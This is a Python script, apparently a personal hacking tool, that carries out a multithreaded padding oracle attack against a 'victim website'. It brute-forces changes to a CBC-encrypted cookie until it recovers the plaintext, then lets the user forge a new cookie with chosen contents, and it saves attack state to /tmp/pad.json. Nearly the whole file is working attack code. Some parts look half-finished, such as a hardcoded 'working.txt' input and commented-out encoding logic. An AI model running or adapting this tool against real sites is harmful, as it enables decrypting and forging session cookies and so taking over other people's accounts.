#---- Made by cybensis@protonmail.com ----#

#=======================================================================================================#
#==========================================      IMPORTS      ==========================================#
#=======================================================================================================#
import sys
import requests
import math
import argparse
from urllib.parse import quote, unquote
import base64
import json
from colorama import Fore
from threading import Thread



#=======================================================================================================#
#=====================================      GLOBAL VARIABLES      ======================================#
#=======================================================================================================#
ARRAY_INDEX = 1
found_char_block = False
STR_ENCODING = "latin-1"
ENCODING_METHOD = 0
current_padding = b"\x01"
plaintext_string = ""
intermediate_string = ""
def set_global_vars(args):
    global URL, MAX_THREADS, BLOCK_SIZE, ATTACK_START, BLOCKS, modified_blocks, COOKIE_NAME, ENCODING_METHOD, ERROR
    ENCODING_METHOD = args.encoding
    URL = args.url
    MAX_THREADS = int(args.threads)
    # if ENCODING_METHOD == 0:
    #     decoded_cookie = base64.urlsafe_b64decode(unquote(args.data)).decode(STR_ENCODING)
    # else:
    #     decoded_cookie = unquote(args.data)
    decoded_cookie = open('working.txt').read().strip()
    BLOCK_SIZE = args.blocksize
    ERROR = args.error
    ATTACK_START = len(decoded_cookie)
    BLOCKS = [decoded_cookie[i:i+BLOCK_SIZE] for i in range(0, len(decoded_cookie), BLOCK_SIZE)]
    modified_blocks = BLOCKS[:]
    COOKIE_NAME = args.cookiename



#=======================================================================================================#
#=====================================          DEBUGGING         ======================================#
#=======================================================================================================#

def debugging():
    if len("".join(BLOCKS)) % BLOCK_SIZE != 0:
        print(Fore.RED + "[!] The data you provided does not completely fill the block/s, please check the \
    data you have provided as well as the string decoding/STR_ENCODING.")
        exit()

    if MAX_THREADS % 2 and MAX_THREADS != 1:
        print(Fore.RED + "[!] Please ensure the number of threads is an even number to prevent problems occuring")
        exit()
        
    try:
        requests.get(URL)
    except:
        print(Fore.RED + "[!] The URL you provided cannot be accessed")
        exit()
    
    

#=======================================================================================================#
#==========================================     FUNCTIONS     ==========================================#
#=======================================================================================================#

def decode_byte(thread, cur_block_index, cur_char, current_block):    
    """decode_byte is used to cycle through a fraction of 256 characters per thread, and decode the \
        current byte, once one has been found all other threads stop by checking found_char_block.

    Args:
        thread (int): The number representation of the current thread
        cur_block_index (int): The index value of the current block that is being modified in the \
                                  modified_blocks array
        cur_char (int): The index value of the current byte that is being modified in the \
                        modified_blocks array 
        current_block (Array[str]): 
    """
    global modified_blocks
    global found_char_block
    req = requests.session()
    a = ATTACK_START
    start_range = math.floor(256 / MAX_THREADS) * (thread - 1)
    end_range = (math.floor(256 / MAX_THREADS) * thread)
    # # for loop to loop through all 256 possible UTF8 characters
    for i in range(start_range, end_range):
        if found_char_block != False:
            return
        new_char = chr(i)
        # If cur_char is -1, then it is the last byte in the array element
        if (cur_char == -1):
            current_block = current_block[:cur_char] + new_char
        else:
            current_block = current_block[:cur_char] + new_char + current_block[cur_char + 1:]
        modified_blocks[cur_block_index] = current_block
        # print(modified_blocks[cur_block_index].encode("latin-1"))
        # cookie_data = quote((base64.b64encode("".join(modified_blocks).encode(STR_ENCODING))).decode("utf8"))
        cookie = return_cookie(modified_blocks)
        # print("".join(modified_blocks).encode("latin-1"))
        # cookie = {COOKIE_NAME: cookie_data}
        res = req.get(URL, cookies=cookie)
        # print(cookie)
        if ERROR not in res.text and BLOCKS[cur_block_index][cur_char] != new_char:
            found_char_block = current_block
            return



def padding_found(original_block, modified_block):
    """Called when a correct padding value is found, and is used to decode the plaintext and return \
       new padding

    Args:
        original_block (Array[char]): The unmodified byte from the original decoded cookie, used to \
                                      calculate the clear text value.
        modified_block (Array[byte]): The modified byte that resulted in the correct padding

    Returns:
        [char] or [str] : If the first byte has been decoded, and we know the plaintext padding, then we return that value \
            otherwise, we return newly calculated padding values that replaces the modifiedChars in the main body
    """
    global current_padding
    global plaintext_string
    global intermediate_string
    index = BLOCK_SIZE - ord(current_padding)

    intermediate_state = ord(modified_block[index]) ^ ord(current_padding)
    plaintext_value = intermediate_state ^ ord(original_block[index])

    intermediate_string = chr(intermediate_state) + intermediate_string
    plaintext_string = chr(plaintext_value) + plaintext_string
    # Used when the first actual padding byte has been found to skip the rest of them
    if len(plaintext_string) == 1:
        skip_plaintext_padding(plaintext_value)
        return plaintext_value

    old_padding = current_padding
    current_padding = chr((ord(current_padding) % BLOCK_SIZE) + 1)

    new_padding_chars = ""
    i = (BLOCK_SIZE - ARRAY_INDEX)
    while i >= index:
        intermediate_state = ord(modified_block[i]) ^ ord(old_padding)
        updated_padding = chr(ord(current_padding) ^ intermediate_state)
        new_padding_chars = updated_padding + new_padding_chars
        i -= 1
    return new_padding_chars



def skip_plaintext_padding(plaintext_padding):
    """Used only when decoding the first byte, as the first bytes plaintext reveals the padding, so \
       all the padding values can be skipped since we already know what they are."""
    global intermediate_string
    global modified_blocks
    global plaintext_string
    global current_padding
    cur_block_index = (len(BLOCKS) - ARRAY_INDEX) - 1
    new_padding = plaintext_padding + 1
    new_padding_chars = chr(ord(intermediate_string) ^ new_padding)
    cur_char = (BLOCK_SIZE - ARRAY_INDEX) - ord(current_padding)
    while cur_char >= (BLOCK_SIZE - plaintext_padding):
        intermediate_state = chr(ord(BLOCKS[cur_block_index][cur_char]) ^ plaintext_padding)
        plaintext_string = chr(plaintext_padding) + plaintext_string
        intermediate_string = intermediate_state + intermediate_string
        new_padding_chars = chr(ord(intermediate_state) ^ new_padding) + new_padding_chars
        cur_char -= 1
    non_padding_char = BLOCK_SIZE - plaintext_padding
    modified_blocks[cur_block_index] = modified_blocks[cur_block_index][:non_padding_char] + new_padding_chars
    current_padding = chr(new_padding)
    return



def initialise():
    """Used to initialise all data by reading from the pad.json file, or creating it if it doesn't exist"""
    global plaintext_string
    global intermediate_string
    global BLOCKS
    global modified_blocks
    global ATTACK_START
    global BLOCK_SIZE
    global MAX_THREADS
    global COOKIE_NAME
    global current_padding
    global URL
    global ERROR
    oracle_data = ""
    try:
        f = open("/tmp/pad.json", "r")
        oracle_data = f.read()
        oracle_data = json.loads(oracle_data)[0]
        f.close()
        BLOCK_SIZE = oracle_data["block_size"]
        intermediate_string = oracle_data["intermediate_state"]
        plaintext_string = oracle_data["plaintext_string"]
        modified_blocks = [oracle_data["modified_block"][i:i+BLOCK_SIZE] for i in range(0, len(oracle_data["modified_block"]), BLOCK_SIZE)]
        BLOCKS = [oracle_data["original_block"][i:i+BLOCK_SIZE] for i in range(0, len(oracle_data["original_block"]), BLOCK_SIZE)]
        ATTACK_START = len("".join(BLOCKS)) - len(plaintext_string)
        current_padding = chr((len(plaintext_string) % BLOCK_SIZE) + 1)
        URL = oracle_data["url"]
        MAX_THREADS = oracle_data["max_threads"]
        COOKIE_NAME = oracle_data["cookie_name"]
        ERROR = oracle_data["error"]
    except:
        BLOCKS = []
      
        

#DISABLED FEATURE, helpful for debugging
# def signal_handler(sig, frame):
#     """Used to intercept a user pressing Ctrl+C to write to the json file first, then exit the script"""
#     if intermediate_string != "":
#         save_json()
#         print("\nUpdated /tmp/pad.json, now exiting")
#     exit()



def save_json():
    """Used to save the current data to a json file under /tmp/pad.json"""

    f = open("/tmp/pad.json", "w+")
    json_to_write = [{
        "intermediate_state": intermediate_string,
        "plaintext_string": plaintext_string,
        "original_block": "".join(BLOCKS),
        "modified_block": "".join(modified_blocks),
        "block_size": BLOCK_SIZE,
        "max_threads": MAX_THREADS,
        "url": URL,
        "cookie_name": COOKIE_NAME,
        "error": ERROR
    }]
    f.write(json.dumps(json_to_write))
    f.close()
    return



def modify_plaintext():
    """Used to modify the first (Non IV) block of data and output a new string"""
    mutable_chars = BLOCK_SIZE
    print(Fore.LIGHTYELLOW_EX + "[*] You can change " + Fore.WHITE + str(mutable_chars) + Fore.LIGHTYELLOW_EX + " characters, in the first block.")
    user_input = input(Fore.LIGHTYELLOW_EX + "[*] Current first block: " + Fore.WHITE + plaintext_string[:BLOCK_SIZE] + Fore.LIGHTYELLOW_EX + " Please enter your changes: " + Fore.WHITE)

    while True:
        if len(user_input) != mutable_chars:
            print(Fore.LIGHTRED_EX + "[!] Your string must be " + Fore.WHITE + str(mutable_chars) + Fore.RED + " characters long")
            user_input = input(Fore.LIGHTYELLOW_EX + "\n[*] Press Ctrl+C if you would like to cancel, otherwise enter your new data: " + Fore.WHITE)
            continue

        cookie_data = ""
        for i in range(0, len(user_input)):
            cookie_data = cookie_data + chr(ord(user_input[i]) ^ ord(intermediate_string[i]))
        cookie_data = cookie_data + "".join(BLOCKS[1:])

        print(Fore.GREEN + "[*] Your new string is: " + Fore.WHITE + user_input + "".join(plaintext_string[BLOCK_SIZE:]))
        print(Fore.GREEN + "[*] Here is your cookie: " + Fore.WHITE + return_cookie(cookie_data)[COOKIE_NAME])
        exit()



def return_cookie(data):
    """Returns the formatted cookie, ready to be sent on in a request

    Args:
        data (Array[str]): The array of modified blocks, ready to encoded into the cookie format

    Returns:
        Dict[str]: Returns the cookie dictionary object
    """
    # if ENCODING_METHOD == 0:
    #     cookie_data =  quote(base64.b64encode("".join(data).encode(STR_ENCODING)).decode("utf8"))
    # else:
    #     cookie_data = quote("".join(data).encode(STR_ENCODING))
    cookie_data = ''.join(data)
    return {COOKIE_NAME: cookie_data}
        


#===================================================================================================#
#=======================================          MAIN BODY        =================================#
#===================================================================================================#

def main():
    global modified_blocks, found_char_block
    # signal.signal(signal.SIGINT, signal_handler)
    if (len(plaintext_string) > 0):
        print(Fore.GREEN + "[*] Resuming attack, current cleartext: " + Fore.WHITE + str(plaintext_string.encode(STR_ENCODING)))
    else:
        print(Fore.GREEN + "[*] Beginning attack now")

    a = ATTACK_START
    while (a > BLOCK_SIZE):
        # After we decode a block, remove the one off the end, reset the new last block, and start attempting
        # to decode the new block
        if (a % BLOCK_SIZE == 0 and a != ATTACK_START):
            modified_blocks.pop()
            modified_blocks[len(modified_blocks) - ARRAY_INDEX] = BLOCKS[len(modified_blocks)-ARRAY_INDEX]

        # -1 because we don't modify the last block
        cur_block_index = (math.ceil(a/BLOCK_SIZE)-1) - ARRAY_INDEX
        cur_char = (a % BLOCK_SIZE)- ARRAY_INDEX
        
        threads = [None] * MAX_THREADS
        for i in range(MAX_THREADS):
            threads[i] = Thread(target=decode_byte, args=(i+1, cur_block_index, cur_char, modified_blocks[cur_block_index]))
            threads[i].daemon = True
            threads[i].start()
        
        
        threads_running = MAX_THREADS
        # This loop keeps an eye on all the currently running threads and will only exit the loop when all 
        # threads are no longer active
        while threads_running != 0:
            threads_running = 0
            for i in range(len(threads)):
                threads_running += 1 if threads[i].is_alive() else 0
        
        # If found_char_block remains false and the loop above is exited, then no characters could be found      
        if found_char_block == False:
            save_json()
            print(Fore.LIGHTRED_EX + "[!] Somethings gone wrong, this is all I could find")
            print(Fore.LIGHTYELLOW_EX + "[*] Plaintext: " + Fore.WHITE + str(plaintext_string.encode(STR_ENCODING)))
            print(Fore.LIGHTYELLOW_EX + "[*] Intermediate State: " + Fore.WHITE + str(intermediate_string.encode(STR_ENCODING)))
            exit()
            
        modified_blocks[cur_block_index] = found_char_block
        
        # If we haven't decoded anything yet, then the first decoded byte will be the actual padding which we can
        # just skip over.
        if len(plaintext_string) == 0:
            plaintext_padding = padding_found(BLOCKS[cur_block_index],modified_blocks[cur_block_index])
            print( Fore.LIGHTYELLOW_EX + "\n[*] Cleartext padding byte found! Skipping to after padding")
            a = a - plaintext_padding
        else:
            new_padding_chars = padding_found(BLOCKS[cur_block_index], modified_blocks[cur_block_index])
            modified_blocks[cur_block_index] = modified_blocks[cur_block_index][:cur_char] + new_padding_chars
            print(Fore.LIGHTYELLOW_EX + "[*] Correct padding found! Current decoded string is: " + Fore.WHITE + str(plaintext_string.encode(STR_ENCODING)))
            a -= 1
        
        if a == BLOCK_SIZE:
            save_json()
            print(Fore.LIGHTYELLOW_EX + "\n[*] Everything has been decoded \U0001F60D\U0001F60D\U0001F60D Plaintext is: " + Fore.WHITE + str(plaintext_string.encode(STR_ENCODING)))
            print(Fore.LIGHTYELLOW_EX + "[*] Intermediate state is: " + Fore.WHITE + str(intermediate_string.encode(STR_ENCODING)))
            print(Fore.LIGHTYELLOW_EX + "\n If you would like to modify the plaintext, please run this script with the -m flag")
            exit()        
        found_char_block = False



#=======================================================================================================#
#==========================================     Arguments     ==========================================#
#=======================================================================================================#

def set_arguments():
    arg = ""
    try:
        arg = sys.argv[1]
    except:
        None
    
    if arg == "-r":
        initialise()
        if len(BLOCKS) == 0:
            print(Fore.RED + "[!] There is nothing to resume, please start a new attack") 
            exit()
    elif arg == "-m" or arg == "--modify":
        initialise()
        if ATTACK_START == BLOCK_SIZE:
            modify_plaintext()
        else:
            print(Fore.RED + "[!] You have not decoded everything or there is no data in /tmp/pad.json")
            exit()
            
    if arg != "-r":
        parser = argparse.ArgumentParser(description="Cybensis' Fast-As-Fuck, multithreaded Padding Oracle attack")
        parser.add_argument("-r", "--resume", required=False, action='store_true', help="Resume an attack from the /tmp/pad.json file")
        parser.add_argument("-m", "--modify", required=False, action='store_true', help="Modify some of the cleartext once everything has been decoded")
        parser.add_argument("-d", "--data", required=False, help="Cipher data to decrypt")
        parser.add_argument("-u", "--url", required=True, help="Victim website URL")
        parser.add_argument("-b", "--blocksize", required=False, default=8, type=int, help="The amount of bytes in each block (Default is 8)")
        parser.add_argument("-e", "--error", required=True, help="The error message that is displayed when there is incorrect padding (case sensitive)")
        parser.add_argument("-c", "--cookiename", required=True, help="The name of the cookie to submit with the data (Just the name)")
        parser.add_argument("--encoding", required=False,default=0, type=int, help="The encoding used by the victims site: [0] Base64 (default) [1] URL encoded")
        parser.add_argument("-t", "--threads", required=False, default=2, type=int, help="Number of threads to run during the attack (More threads == faster)")
        args = parser.parse_args()
        set_global_vars(args)
        

set_arguments()
debugging()
main()